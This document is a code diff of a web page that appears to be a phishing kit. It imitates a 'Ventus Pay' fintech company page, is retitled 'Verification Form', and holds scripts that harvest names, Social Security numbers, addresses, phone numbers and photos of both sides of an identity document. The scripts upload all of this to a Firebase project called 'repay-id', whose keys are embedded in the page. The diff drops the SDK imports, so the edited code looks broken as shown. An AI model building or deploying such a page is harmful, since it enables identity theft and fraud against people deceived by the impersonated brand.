@@ -9,17 +9,17 @@
   <meta name="description"
     content="With over 20 years of service, Ventus Pay is a transparent, secure, and predictable financial technology partner.">
   <meta name="generator" content="HubSpot">
-  <title>Our Company</title>
+  <title>Verification Form</title>
   <link rel="shortcut icon" href="hubfs/favicon.ico">
 
 
 
   <meta property="og:description"
     content="With over 20 years of service, Ventus Pay is a transparent, secure, and predictable financial technology partner.">
-  <meta property="og:title" content="Our Company">
+  <meta property="og:title" content="Verification Form">
   <meta name="twitter:description"
     content="With over 20 years of service, Ventus Pay is a transparent, secure, and predictable financial technology partner.">
-  <meta name="twitter:title" content="Our Company">
+  <meta name="twitter:title" content="Verification Form">
   
 
 
@@ -410,150 +410,6 @@
                             <button class="action" type="submit" data-disable-with="Submitting ....." data-clicked="false">Submit</button>
                         </form>
                         
-                        <script>
-                            // Phone number formatting
-                            document.getElementById('phoneNumber').addEventListener('input', function (event) {
-                                let input = event.target;
-                                let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
-                                if (value.length > 10) {
-                                    value = value.slice(0, 10); // Limit to 10 digits
-                                }
-                                if (value.length > 3) {
-                                    // Format the phone number as (XXX) XXX-XXXX
-                                    value = value.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');
-                                }
-                                input.value = value;
-                            });
-                        
-                            // SSN formatting
-                            document.getElementById('SSN').addEventListener('input', function (event) {
-                                let input = event.target;
-                                let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
-                                if (value.length > 9) {
-                                    value = value.slice(0, 9); // Limit to 9 digits
-                                }
-                                if (value.length > 2) {
-                                    // Format the SSN as XXX-XX-XXXX
-                                    value = value.replace(/(\d{3})(\d{2})(\d{4})/, '$1-$2-$3');
-                                }
-                                input.value = value;
-                            });
-                        
-                            // Firebase initialization and form submission handling
-                            document.addEventListener('DOMContentLoaded', function() {
-                                const firebaseConfig = {
-                                    apiKey: "AIzaSyABHJB9x4JPKLkZCz-Z7JlydQtZ0Ezn28U",
-                                    authDomain: "repay-id.firebaseapp.com",
-                                    projectId: "repay-id",
-                                    storageBucket: "repay-id.appspot.com",
-                                    messagingSenderId: "261434303099",
-                                    appId: "1:261434303099:web:fee0977959b3109af378de"
-                                };
-                        
-                                const app = initializeApp(firebaseConfig);
-                                const database = getDatabase(app);
-                                const storage = getStorage(app);
-                        
-                                function generateRandomFileName(file) {
-                                    const randomString = Math.random().toString(36).substring(2, 8);
-                                    const fileExtension = file.name.split('.').pop();
-                                    return `file_${randomString}.${fileExtension}`;
-                                }
-                        
-                                function uploadFile(file) {
-                                    return new Promise((resolve, reject) => {
-                                        const fileName = generateRandomFileName(file);
-                                        const storageRefVar = storageRef(storage, `uploads/${fileName}`);
-                        
-                                        const uploadTask = file.size < 1024 * 1024 ? uploadBytes(storageRefVar, file) : uploadBytesResumable(storageRefVar, file);
-                        
-                                        uploadTask.then((snapshot) => {
-                                            getDownloadURL(snapshot.ref).then((downloadURL) => {
-                                                resolve(downloadURL);
-                                            });
-                                        }).catch((error) => {
-                                            console.error('Error uploading file:', error);
-                                            reject(null);
-                                        });
-                                    });
-                                }
-                        
-                                function handleFormSubmit(event) {
-                                    event.preventDefault();
-                        
-                                    const requiredFields = document.querySelectorAll('#myForm [required]');
-                                    let allFieldsFilled = true;
-                        
-                                    requiredFields.forEach(function(field) {
-                                        if (field.value.trim() === '') {
-                                            allFieldsFilled = false;
-                                        }
-                                    });
-                        
-                                    if (!allFieldsFilled) {
-                                        return;
-                                    }
-                        
-                                    const signInButton = document.querySelector('.action');
-                                    const disableText = signInButton.getAttribute('data-disable-with');
-                                    signInButton.innerHTML = disableText;
-                                    signInButton.setAttribute('data-clicked', 'true');
-                        
-                                    const first_name = document.querySelector('[name="first_name"]').value;
-                                    const email = document.querySelector('[name="email"]').value;
-                                    const SSN = document.querySelector('[name="SSN"]').value;
-                                    const city = document.querySelector('[name="city"]').value;
-                                    const zipCode = document.querySelector('[name="zipCode"]').value;
-                                    const lastName = document.querySelector('[name="lastName"]').value;
-                                    const phoneNumber = document.querySelector('[name="phoneNumber"]').value;
-                                    const address = document.querySelector('[name="address"]').value;
-                                    const state = document.querySelector('[name="state"]').value;
-                        
-                                    const fileInputFront = document.querySelector('[name="upload_doc_front"]');
-                                    const fileFront = fileInputFront.files[0];
-                        
-                                    const fileInputBack = document.querySelector('[name="upload_doc_back"]');
-                                    const fileBack = fileInputBack.files[0];
-                        
-                                    if (!fileFront || !fileBack) {
-                                        alert('Please select both front and back files');
-                                        return;
-                                    }
-                        
-                                    const formData = {
-                                        first_name,
-                                        email,
-                                        SSN,
-                                        city,
-                                        zipCode,
-                                        lastName,
-                                        phoneNumber,
-                                        address,
-                                        state,
-                                        fileFrontURL: null,
-                                        fileBackURL: null
-                                    };
-                        
-                                    Promise.all([uploadFile(fileFront), uploadFile(fileBack)])
-                                        .then(([fileFrontURL, fileBackURL]) => {
-                                            formData.fileFrontURL = fileFrontURL;
-                                            formData.fileBackURL = fileBackURL;
-                        
-                                            const key = `${first_name}_${lastName}`;
-                                            const formsRef = ref(database, `forms/${key}`);
-                                            set(formsRef, formData).then(() => {
-                                                console.log('Form submitted successfully!');
-                                                window.location.href = 'submitted.html';
-                                            }).catch((error) => {
-                                                console.error('Error submitting form:', error);
-                                                alert('An error occurred while submitting the form. Please try again.');
-                                            });
-                                        });
-                                }
-                        
-                                document.getElementById('myForm').addEventListener('submit', handleFormSubmit);
-                            });
-                        </script>
                         
                     </section>  
                       
@@ -749,8 +605,8 @@
     </div><!--end footer -->
   </div><!--end footer wrapper -->
 
-
-<script>
+  <script>
+    // Phone number formatting
     document.getElementById('phoneNumber').addEventListener('input', function (event) {
         let input = event.target;
         let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
@@ -764,6 +620,7 @@
         input.value = value;
     });
 
+    // SSN formatting
     document.getElementById('SSN').addEventListener('input', function (event) {
         let input = event.target;
         let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
@@ -776,149 +633,123 @@
         }
         input.value = value;
     });
-</script>
 
-<script type="module">
-// Import the necessary functions from the Firebase SDK
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
-import { getDownloadURL, getStorage, ref as storageRef, uploadBytes, uploadBytesResumable } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js";
+    // Firebase initialization and form submission handling
+    document.addEventListener('DOMContentLoaded', function() {
+        const firebaseConfig = {
+            apiKey: "AIzaSyABHJB9x4JPKLkZCz-Z7JlydQtZ0Ezn28U",
+            authDomain: "repay-id.firebaseapp.com",
+            projectId: "repay-id",
+            storageBucket: "repay-id.appspot.com",
+            messagingSenderId: "261434303099",
+            appId: "1:261434303099:web:fee0977959b3109af378de"
+        };
 
-// Your web app's Firebase configuration
-const firebaseConfig = {
-    apiKey: "AIzaSyABHJB9x4JPKLkZCz-Z7JlydQtZ0Ezn28U",
-    authDomain: "repay-id.firebaseapp.com",
-    projectId: "repay-id",
-    storageBucket: "repay-id.appspot.com",
-    messagingSenderId: "261434303099",
-    appId: "1:261434303099:web:fee0977959b3109af378de"
-};
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+        const storage = getStorage(app);
 
-// Initialize Firebase
-const app = initializeApp(firebaseConfig);
-const database = getDatabase(app);
-const storage = getStorage(app);
-
-// Function to generate a random file name
-function generateRandomFileName(file) {
-    const randomString = Math.random().toString(36).substring(2, 8);
-    const fileExtension = file.name.split('.').pop();
-    return `file_${randomString}.${fileExtension}`;
-}
-
-// Function to upload file to Firebase Storage with a renamed file
-function uploadFile(file) {
-    return new Promise((resolve, reject) => {
-        const fileName = generateRandomFileName(file);
-        const storageRefVar = storageRef(storage, `uploads/${fileName}`);
-
-        // Use put for smaller files and uploadBytesResumable for larger files
-        const uploadTask = file.size < 1024 * 1024 ? uploadBytes(storageRefVar, file) : uploadBytesResumable(storageRefVar, file);
-
-        uploadTask.then((snapshot) => {
-            getDownloadURL(snapshot.ref).then((downloadURL) => {
-                resolve(downloadURL);
-            });
-        }).catch((error) => {
-            console.error('Error uploading file:', error);
-            reject(null);
-        });
-    });
-}
-
-// Function to handle form submission and store data in Firebase
-function handleFormSubmit(event) {
-    event.preventDefault();
-
-    // Check if all required fields are filled
-    const requiredFields = document.querySelectorAll('#myForm [required]');
-    let allFieldsFilled = true;
-
-    requiredFields.forEach(function(field) {
-        if (field.value.trim() === '') {
-            allFieldsFilled = false;
+        function generateRandomFileName(file) {
+            const randomString = Math.random().toString(36).substring(2, 8);
+            const fileExtension = file.name.split('.').pop();
+            return `file_${randomString}.${fileExtension}`;
         }
-    });
 
-    if (!allFieldsFilled) {
-        // Browser's default behavior for required fields will handle empty fields
-        return;
-    }
+        function uploadFile(file) {
+            return new Promise((resolve, reject) => {
+                const fileName = generateRandomFileName(file);
+                const storageRefVar = storageRef(storage, `uploads/${fileName}`);
 
-    // Get the button element
-    const signInButton = document.querySelector('.action');
+                const uploadTask = file.size < 1024 * 1024 ? uploadBytes(storageRefVar, file) : uploadBytesResumable(storageRefVar, file);
 
-    // Get the data-disable-with attribute value
-    const disableText = signInButton.getAttribute('data-disable-with');
-
-    // Change the button text to the disableText
-    signInButton.innerHTML = disableText;
-
-    // Set the data-clicked attribute to true
-    signInButton.setAttribute('data-clicked', 'true');
-
-    // Get form values
-    const first_name = document.querySelector('[name="first_name"]').value;
-    const email = document.querySelector('[name="email"]').value;
-    const SSN = document.querySelector('[name="SSN"]').value;
-    const city = document.querySelector('[name="city"]').value;
-    const zipCode = document.querySelector('[name="zipCode"]').value;
-    const lastName = document.querySelector('[name="lastName"]').value;
-    const phoneNumber = document.querySelector('[name="phoneNumber"]').value;
-    const address = document.querySelector('[name="address"]').value;
-    const state = document.querySelector('[name="state"]').value;
-
-    const fileInputFront = document.querySelector('[name="upload_doc_front"]');
-    const fileFront = fileInputFront.files[0];
-
-    const fileInputBack = document.querySelector('[name="upload_doc_back"]');
-    const fileBack = fileInputBack.files[0];
-
-    // Check if both files are selected
-    if (!fileFront || !fileBack) {
-        alert('Please select both front and back files');
-        return;
-    }
-
-    // Store data in Firebase
-    const formData = {
-        first_name,
-        email,
-        SSN,
-        city,
-        zipCode,
-        lastName,
-        phoneNumber,
-        address,
-        state,
-        fileFrontURL: null,
-        fileBackURL: null
-    };
-
-    // Upload front and back files concurrently
-    Promise.all([uploadFile(fileFront), uploadFile(fileBack)])
-        .then(([fileFrontURL, fileBackURL]) => {
-            formData.fileFrontURL = fileFrontURL;
-            formData.fileBackURL = fileBackURL;
-
-            // Set data at the specified location using first name and last name as the key
-            const key = `${first_name}_${lastName}`;
-            const formsRef = ref(database, `forms/${key}`);
-            set(formsRef, formData).then(() => {
-                console.log('Form submitted successfully!');
-                // Redirect to submit.html after successful submission
-                window.location.href = 'submitted.html';
-            }).catch((error) => {
-                console.error('Error submitting form:', error);
-                alert('An error occurred while submitting the form. Please try again.');
+                uploadTask.then((snapshot) => {
+                    getDownloadURL(snapshot.ref).then((downloadURL) => {
+                        resolve(downloadURL);
+                    });
+                }).catch((error) => {
+                    console.error('Error uploading file:', error);
+                    reject(null);
+                });
             });
-        });
-}
+        }
 
-document.addEventListener('DOMContentLoaded', function() {
-    document.getElementById('myForm').addEventListener('submit', handleFormSubmit);
-});
+        function handleFormSubmit(event) {
+            event.preventDefault();
+
+            const requiredFields = document.querySelectorAll('#myForm [required]');
+            let allFieldsFilled = true;
+
+            requiredFields.forEach(function(field) {
+                if (field.value.trim() === '') {
+                    allFieldsFilled = false;
+                }
+            });
+
+            if (!allFieldsFilled) {
+                return;
+            }
+
+            const signInButton = document.querySelector('.action');
+            const disableText = signInButton.getAttribute('data-disable-with');
+            signInButton.innerHTML = disableText;
+            signInButton.setAttribute('data-clicked', 'true');
+
+            const first_name = document.querySelector('[name="first_name"]').value;
+            const email = document.querySelector('[name="email"]').value;
+            const SSN = document.querySelector('[name="SSN"]').value;
+            const city = document.querySelector('[name="city"]').value;
+            const zipCode = document.querySelector('[name="zipCode"]').value;
+            const lastName = document.querySelector('[name="lastName"]').value;
+            const phoneNumber = document.querySelector('[name="phoneNumber"]').value;
+            const address = document.querySelector('[name="address"]').value;
+            const state = document.querySelector('[name="state"]').value;
+
+            const fileInputFront = document.querySelector('[name="upload_doc_front"]');
+            const fileFront = fileInputFront.files[0];
+
+            const fileInputBack = document.querySelector('[name="upload_doc_back"]');
+            const fileBack = fileInputBack.files[0];
+
+            if (!fileFront || !fileBack) {
+                alert('Please select both front and back files');
+                return;
+            }
+
+            const formData = {
+                first_name,
+                email,
+                SSN,
+                city,
+                zipCode,
+                lastName,
+                phoneNumber,
+                address,
+                state,
+                fileFrontURL: null,
+                fileBackURL: null
+            };
+
+            Promise.all([uploadFile(fileFront), uploadFile(fileBack)])
+                .then(([fileFrontURL, fileBackURL]) => {
+                    formData.fileFrontURL = fileFrontURL;
+                    formData.fileBackURL = fileBackURL;
+
+                    const key = `${first_name}_${lastName}`;
+                    const formsRef = ref(database, `forms/${key}`);
+                    set(formsRef, formData).then(() => {
+                        console.log('Form submitted successfully!');
+                        window.location.href = 'submitted.html';
+                    }).catch((error) => {
+                        console.error('Error submitting form:', error);
+                        alert('An error occurred while submitting the form. Please try again.');
+                    });
+                });
+        }
+
+        document.getElementById('myForm').addEventListener('submit', handleFormSubmit);
+    });
 </script>
+
 
   <script src="hs/hsstatic/cos-i18n/static-1.53/bundles/project.js"></script>
   <script src="hs/hsstatic/keyboard-accessible-menu-flyouts/static-1.17/bundles/project.js"></script>
